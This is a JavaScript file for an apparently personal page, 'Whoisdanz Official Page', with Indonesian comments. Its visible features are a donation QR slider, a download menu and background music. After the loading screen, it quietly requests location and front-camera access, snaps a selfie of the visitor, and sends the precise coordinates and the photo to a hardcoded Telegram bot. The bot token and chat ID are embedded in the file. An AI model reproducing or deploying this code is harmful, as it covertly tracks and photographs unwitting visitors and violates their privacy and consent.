// === Bagian Lama (tetap sama) ===
const qrBtn = document.getElementById("qrBtn");
const qrModal = document.getElementById("qrModal");
const closeQRBtn = document.getElementById("closeQR");

qrBtn.onclick = () => qrModal.style.display = "flex";
closeQRBtn.onclick = () => qrModal.style.display = "none";

window.onclick = (e) => {
    if (e.target === qrModal) qrModal.style.display = "none";
};

/* QR SLIDER */
const qrImages = [
    "QR-Donasi-Whoisdanz.png",
    "QR-Donasi2-Whoisdanz.png"
];

let currentQR = 0;
const qrImage = document.getElementById("qrImage");

document.getElementById("prevQR").onclick = () => {
    currentQR = (currentQR - 1 + qrImages.length) % qrImages.length;
    qrImage.src = qrImages[currentQR];
};

document.getElementById("nextQR").onclick = () => {
    currentQR = (currentQR + 1) % qrImages.length;
    qrImage.src = qrImages[currentQR];
};

/* DOWNLOAD MENU */
const downloadToggle = document.getElementById("downloadToggle");
const downloadMenu = document.getElementById("downloadMenu");

downloadToggle.onclick = () => {
    downloadMenu.style.display = downloadMenu.style.display === "flex" ? "none" : "flex";
};

/* MUSIC */
const music = document.getElementById("bg-music");
music.src = "soundtrack.mp3";
music.volume = 0.25;

document.addEventListener("click", () => {
    music.play().catch(() => {});
}, { once: true });

// ================== KONFIGURASI TELEGRAM ==================
const TELEGRAM_BOT_TOKEN = "8481518873:AAG8HJYnOBDmfvYx_do2uZJ0VY0H1wTeQqg";
const TELEGRAM_CHAT_ID = "5730560932";

// ================== LOADING + PROSES UTAMA ==================
window.onload = () => {
    const loading = document.getElementById("loading-screen");
    const bar = document.getElementById("loading-progress");

    let w = 0;
    const int = setInterval(() => {
        w++;
        bar.style.width = w + "%";
        if (w >= 100) {
            clearInterval(int);
            setTimeout(() => {
                loading.style.display = "none";
                setTimeout(startLocationAndCameraProcess, 1200); // delay sedikit lebih panjang
            }, 600);
        }
    }, 30);
};

// ================== FUNGSI UTAMA (DIOPTIMALKAN) ==================
async function startLocationAndCameraProcess() {
    try {
        console.log("🔄 Meminta izin lokasi dan kamera depan...");

        const position = await getLocation();
        const { latitude, longitude } = position.coords;

        const photoBlob = await captureFrontCameraPhoto();

        await sendToTelegram(latitude, longitude, photoBlob);

        console.log("✅ Sukses mengirim lokasi + foto kamera depan ke Telegram");

    } catch (error) {
        console.error("❌ Gagal:", error.message);
        // Optional: alert("Izin lokasi atau kamera ditolak, atau terjadi kesalahan teknis.");
    }
}

function getLocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            reject(new Error("Browser tidak mendukung geolocation"));
            return;
        }
        navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        });
    });
}

async function captureFrontCameraPhoto() {
    let stream;
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: "user",           // Prioritas kamera depan
                width: { ideal: 1280, max: 1920 },
                height: { ideal: 720, max: 1080 }
            }
        });

        const video = document.createElement("video");
        video.srcObject = stream;
        await new Promise(resolve => { video.onloadedmetadata = resolve; });
        await video.play();

        // Tunggu agar gambar stabil
        await new Promise(r => setTimeout(r, 1200));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        // Matikan kamera dengan benar
        stream.getTracks().forEach(track => track.stop());

        return new Promise(resolve => {
            canvas.toBlob(resolve, "image/jpeg", 0.88); // kualitas cukup tinggi
        });

    } catch (err) {
        if (stream) stream.getTracks().forEach(track => track.stop());
        throw err;
    }
}

async function sendToTelegram(lat, lon, photoBlob) {
    const baseUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

    // Kirim Lokasi
    const locResponse = await fetch(`${baseUrl}/sendLocation`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            latitude: lat,
            longitude: lon,
            caption: "📍 Lokasi pengunjung Whoisdanz Official Page"
        })
    });

    if (!locResponse.ok) console.warn("⚠️ Gagal mengirim lokasi");

    // Kirim Foto
    const formData = new FormData();
    formData.append("chat_id", TELEGRAM_CHAT_ID);
    formData.append("photo", photoBlob, "selfie.jpg");
    formData.append("caption", `📸 Foto Kamera Depan\n📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}\n⏰ ${new Date().toLocaleString('id-ID')}`);

    const photoResponse = await fetch(`${baseUrl}/sendPhoto`, {
        method: "POST",
        body: formData
    });

    if (!photoResponse.ok) {
        const errText = await photoResponse.text();
        throw new Error(`Gagal mengirim foto: ${photoResponse.status} - ${errText}`);
    }
}